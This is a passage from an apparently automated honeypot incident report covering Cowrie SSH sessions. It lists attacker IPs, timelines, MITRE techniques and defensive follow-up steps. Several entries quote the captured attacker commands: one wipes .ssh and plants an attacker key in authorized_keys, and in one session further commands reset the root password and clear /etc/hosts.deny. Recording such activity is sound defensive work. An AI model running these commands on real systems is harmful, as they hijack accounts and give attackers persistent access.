| `2026-05-15 05:34:02` | `cowrie.command.failed` |
| `2026-05-15 05:34:02` | `cowrie.log.closed` |
| `2026-05-15 05:34:03` | `cowrie.session.params` |
| `2026-05-15 05:34:03` | `cowrie.command.input` |
| `2026-05-15 05:34:03` | `cowrie.session.file_download` |
| `2026-05-15 05:34:03` | `cowrie.log.closed` |
| `2026-05-15 05:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28d00d2b30fe

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:34 |
| **Last Seen** | 2026-05-15 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:34:05` | `cowrie.session.connect` |
| `2026-05-15 05:34:05` | `cowrie.client.version` |
| `2026-05-15 05:34:05` | `cowrie.client.kex` |
| `2026-05-15 05:34:06` | `cowrie.login.success` |
| `2026-05-15 05:34:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a133332052df

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:35 |
| **Last Seen** | 2026-05-15 05:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:35:13` | `cowrie.session.connect` |
| `2026-05-15 05:35:13` | `cowrie.client.version` |
| `2026-05-15 05:35:14` | `cowrie.client.kex` |
| `2026-05-15 05:35:14` | `cowrie.login.success` |
| `2026-05-15 05:35:15` | `cowrie.session.params` |
| `2026-05-15 05:35:15` | `cowrie.command.input` |
| `2026-05-15 05:35:15` | `cowrie.command.failed` |
| `2026-05-15 05:35:15` | `cowrie.log.closed` |
| `2026-05-15 05:35:15` | `cowrie.session.params` |
| `2026-05-15 05:35:15` | `cowrie.command.input` |
| `2026-05-15 05:35:16` | `cowrie.session.file_download` |
| `2026-05-15 05:35:16` | `cowrie.log.closed` |
| `2026-05-15 05:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b04e7e65ea60

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:35 |
| **Last Seen** | 2026-05-15 05:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:35:16` | `cowrie.session.connect` |
| `2026-05-15 05:35:16` | `cowrie.client.version` |
| `2026-05-15 05:35:16` | `cowrie.client.kex` |
| `2026-05-15 05:35:17` | `cowrie.login.success` |
| `2026-05-15 05:35:17` | `cowrie.session.params` |
| `2026-05-15 05:35:17` | `cowrie.command.input` |
| `2026-05-15 05:35:17` | `cowrie.command.failed` |
| `2026-05-15 05:35:18` | `cowrie.log.closed` |
| `2026-05-15 05:35:18` | `cowrie.session.params` |
| `2026-05-15 05:35:18` | `cowrie.command.input` |
| `2026-05-15 05:35:18` | `cowrie.session.file_download` |
| `2026-05-15 05:35:18` | `cowrie.log.closed` |
| `2026-05-15 05:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79c6924c00f9

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:35 |
| **Last Seen** | 2026-05-15 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:35:18` | `cowrie.session.connect` |
| `2026-05-15 05:35:18` | `cowrie.client.version` |
| `2026-05-15 05:35:19` | `cowrie.client.kex` |
| `2026-05-15 05:35:19` | `cowrie.login.success` |
| `2026-05-15 05:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bb726bc44c2

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:35 |
| **Last Seen** | 2026-05-15 05:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:35:20` | `cowrie.session.connect` |
| `2026-05-15 05:35:20` | `cowrie.client.version` |
| `2026-05-15 05:35:20` | `cowrie.client.kex` |
| `2026-05-15 05:35:21` | `cowrie.login.success` |
| `2026-05-15 05:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b748a00d17c6

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:36 |
| **Last Seen** | 2026-05-15 05:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:36:49` | `cowrie.session.connect` |
| `2026-05-15 05:36:49` | `cowrie.client.version` |
| `2026-05-15 05:36:49` | `cowrie.client.kex` |
| `2026-05-15 05:36:49` | `cowrie.login.success` |
| `2026-05-15 05:36:49` | `cowrie.session.params` |
| `2026-05-15 05:36:49` | `cowrie.command.input` |
| `2026-05-15 05:36:49` | `cowrie.command.failed` |
| `2026-05-15 05:36:50` | `cowrie.log.closed` |
| `2026-05-15 05:36:50` | `cowrie.session.params` |
| `2026-05-15 05:36:50` | `cowrie.command.input` |
| `2026-05-15 05:36:50` | `cowrie.session.file_download` |
| `2026-05-15 05:36:50` | `cowrie.log.closed` |
| `2026-05-15 05:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f77fe91ff3f0

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:36 |
| **Last Seen** | 2026-05-15 05:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:36:52` | `cowrie.session.connect` |
| `2026-05-15 05:36:52` | `cowrie.client.version` |
| `2026-05-15 05:36:52` | `cowrie.client.kex` |
| `2026-05-15 05:36:53` | `cowrie.login.success` |
| `2026-05-15 05:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cb3ea6e3438

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-05-15 05:39 |
| **Last Seen** | 2026-05-15 05:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:39:14` | `cowrie.session.connect` |
| `2026-05-15 05:39:14` | `cowrie.client.version` |
| `2026-05-15 05:39:14` | `cowrie.client.kex` |
| `2026-05-15 05:39:16` | `cowrie.login.success` |
| `2026-05-15 05:39:16` | `cowrie.session.params` |
| `2026-05-15 05:39:16` | `cowrie.command.input` |
| `2026-05-15 05:39:16` | `cowrie.command.failed` |
| `2026-05-15 05:39:17` | `cowrie.log.closed` |
| `2026-05-15 05:39:17` | `cowrie.session.params` |
| `2026-05-15 05:39:17` | `cowrie.command.input` |
| `2026-05-15 05:39:18` | `cowrie.session.file_download` |
| `2026-05-15 05:39:18` | `cowrie.log.closed` |
| `2026-05-15 05:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4f5eed26f1c

| Field | Detail |
|---|---|
| **Source IP** | `102.23.122[.]235` |
| **First Seen** | 2026-05-15 05:39 |
| **Last Seen** | 2026-05-15 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:39:21` | `cowrie.session.connect` |
| `2026-05-15 05:39:21` | `cowrie.client.version` |
| `2026-05-15 05:39:21` | `cowrie.client.kex` |
| `2026-05-15 05:39:22` | `cowrie.login.success` |
| `2026-05-15 05:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.23.122[.]235` to AbuseIPDB if not already reported
- [ ] Block `102.23.122[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-099f0e62c007

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:41 |
| **Last Seen** | 2026-05-15 05:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:41:33` | `cowrie.session.connect` |
| `2026-05-15 05:41:33` | `cowrie.client.version` |
| `2026-05-15 05:41:34` | `cowrie.client.kex` |
| `2026-05-15 05:41:34` | `cowrie.login.success` |
| `2026-05-15 05:41:35` | `cowrie.session.params` |
| `2026-05-15 05:41:35` | `cowrie.command.input` |
| `2026-05-15 05:41:35` | `cowrie.command.failed` |
| `2026-05-15 05:41:35` | `cowrie.log.closed` |
| `2026-05-15 05:41:35` | `cowrie.session.params` |
| `2026-05-15 05:41:35` | `cowrie.command.input` |
| `2026-05-15 05:41:35` | `cowrie.session.file_download` |
| `2026-05-15 05:41:35` | `cowrie.log.closed` |
| `2026-05-15 05:41:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc58682e87d5

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:41 |
| **Last Seen** | 2026-05-15 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:41:38` | `cowrie.session.connect` |
| `2026-05-15 05:41:38` | `cowrie.client.version` |
| `2026-05-15 05:41:38` | `cowrie.client.kex` |
| `2026-05-15 05:41:39` | `cowrie.login.success` |
| `2026-05-15 05:41:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc3b98d8eeed

| Field | Detail |
|---|---|
| **Source IP** | `113.193.234[.]210` |
| **First Seen** | 2026-05-15 05:42 |
| **Last Seen** | 2026-05-15 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:42:14` | `cowrie.session.connect` |
| `2026-05-15 05:42:14` | `cowrie.client.version` |
| `2026-05-15 05:42:14` | `cowrie.client.kex` |
| `2026-05-15 05:42:15` | `cowrie.login.success` |
| `2026-05-15 05:42:15` | `cowrie.session.params` |
| `2026-05-15 05:42:15` | `cowrie.command.input` |
| `2026-05-15 05:42:15` | `cowrie.command.failed` |
| `2026-05-15 05:42:15` | `cowrie.log.closed` |
| `2026-05-15 05:42:15` | `cowrie.session.params` |
| `2026-05-15 05:42:15` | `cowrie.command.input` |
| `2026-05-15 05:42:15` | `cowrie.session.file_download` |
| `2026-05-15 05:42:15` | `cowrie.log.closed` |
| `2026-05-15 05:42:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.193.234[.]210` to AbuseIPDB if not already reported
- [ ] Block `113.193.234[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c7c408d582f

| Field | Detail |
|---|---|
| **Source IP** | `113.193.234[.]210` |
| **First Seen** | 2026-05-15 05:42 |
| **Last Seen** | 2026-05-15 05:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:42:16` | `cowrie.session.connect` |
| `2026-05-15 05:42:16` | `cowrie.client.version` |
| `2026-05-15 05:42:16` | `cowrie.client.kex` |
| `2026-05-15 05:42:16` | `cowrie.login.success` |
| `2026-05-15 05:42:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.193.234[.]210` to AbuseIPDB if not already reported
- [ ] Block `113.193.234[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d743476260a7

| Field | Detail |
|---|---|
| **Source IP** | `121.229.9[.]97` |
| **First Seen** | 2026-05-15 05:43 |
| **Last Seen** | 2026-05-15 05:44 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:RFGOesaeOP6B"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:43:57` | `cowrie.session.connect` |
| `2026-05-15 05:43:57` | `cowrie.client.version` |
| `2026-05-15 05:43:57` | `cowrie.client.kex` |
| `2026-05-15 05:43:58` | `cowrie.login.success` |
| `2026-05-15 05:43:58` | `cowrie.session.params` |
| `2026-05-15 05:43:58` | `cowrie.command.input` |
| `2026-05-15 05:43:58` | `cowrie.command.failed` |
| `2026-05-15 05:43:58` | `cowrie.log.closed` |
| `2026-05-15 05:43:58` | `cowrie.session.params` |
| `2026-05-15 05:43:58` | `cowrie.command.input` |
| `2026-05-15 05:43:59` | `cowrie.session.file_download` |
| `2026-05-15 05:43:59` | `cowrie.log.closed` |
| `2026-05-15 05:44:10` | `cowrie.session.params` |
| `2026-05-15 05:44:10` | `cowrie.command.input` |
| `2026-05-15 05:44:10` | `cowrie.log.closed` |
| `2026-05-15 05:44:10` | `cowrie.session.params` |
| `2026-05-15 05:44:10` | `cowrie.command.input` |
| `2026-05-15 05:44:10` | `cowrie.log.closed` |
| `2026-05-15 05:44:11` | `cowrie.session.params` |
| `2026-05-15 05:44:11` | `cowrie.command.input` |
| `2026-05-15 05:44:11` | `cowrie.session.file_download` |
| `2026-05-15 05:44:11` | `cowrie.log.closed` |
| `2026-05-15 05:44:11` | `cowrie.session.params` |
| `2026-05-15 05:44:11` | `cowrie.command.input` |
| `2026-05-15 05:44:11` | `cowrie.log.closed` |
| `2026-05-15 05:44:12` | `cowrie.session.params` |
| `2026-05-15 05:44:12` | `cowrie.command.input` |
| `2026-05-15 05:44:12` | `cowrie.log.closed` |
| `2026-05-15 05:44:12` | `cowrie.session.params` |
| `2026-05-15 05:44:12` | `cowrie.command.input` |
| `2026-05-15 05:44:12` | `cowrie.command.input` |
| `2026-05-15 05:44:12` | `cowrie.log.closed` |
| `2026-05-15 05:44:13` | `cowrie.session.params` |
| `2026-05-15 05:44:13` | `cowrie.command.input` |
| `2026-05-15 05:44:13` | `cowrie.log.closed` |
| `2026-05-15 05:44:13` | `cowrie.session.params` |
| `2026-05-15 05:44:13` | `cowrie.command.input` |
| `2026-05-15 05:44:13` | `cowrie.log.closed` |
| `2026-05-15 05:44:14` | `cowrie.session.params` |
| `2026-05-15 05:44:14` | `cowrie.command.input` |
| `2026-05-15 05:44:14` | `cowrie.log.closed` |
| `2026-05-15 05:44:14` | `cowrie.session.params` |
| `2026-05-15 05:44:14` | `cowrie.command.input` |
| `2026-05-15 05:44:14` | `cowrie.log.closed` |
| `2026-05-15 05:44:15` | `cowrie.session.params` |
| `2026-05-15 05:44:15` | `cowrie.command.input` |
| `2026-05-15 05:44:15` | `cowrie.log.closed` |
| `2026-05-15 05:44:15` | `cowrie.session.params` |
| `2026-05-15 05:44:15` | `cowrie.command.input` |
| `2026-05-15 05:44:16` | `cowrie.log.closed` |
| `2026-05-15 05:44:16` | `cowrie.session.params` |
| `2026-05-15 05:44:16` | `cowrie.command.input` |
| `2026-05-15 05:44:16` | `cowrie.log.closed` |
| `2026-05-15 05:44:16` | `cowrie.session.params` |
| `2026-05-15 05:44:16` | `cowrie.command.input` |
| `2026-05-15 05:44:17` | `cowrie.log.closed` |
| `2026-05-15 05:44:17` | `cowrie.session.params` |
| `2026-05-15 05:44:17` | `cowrie.command.input` |
| `2026-05-15 05:44:17` | `cowrie.log.closed` |
| `2026-05-15 05:44:17` | `cowrie.session.params` |
| `2026-05-15 05:44:17` | `cowrie.command.input` |
| `2026-05-15 05:44:18` | `cowrie.log.closed` |
| `2026-05-15 05:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.229.9[.]97` to AbuseIPDB if not already reported
- [ ] Block `121.229.9[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `159.203.20[.]239` | **311** | 2026-05-15 03:52 | 2026-05-15 06:57 | 202m | 0 | `T1592` | 🟠 MEDIUM |
| `222.124.177[.]148` | **28** | 2026-05-15 04:51 | 2026-05-15 05:36 | 0m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `82.169.135[.]117` | **28** | 2026-05-15 05:03 | 2026-05-15 05:42 | 0m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.223.199[.]221` | **7** | 2026-05-15 05:44 | 2026-05-15 05:57 | 14m | 0 | `T1592` | 🟢 LOW |
| `34.78.6[.]235` | **7** | 2026-05-15 04:12 | 2026-05-15 04:13 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.229.9[.]97` | **2** | 2026-05-15 05:43 | 2026-05-15 05:46 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
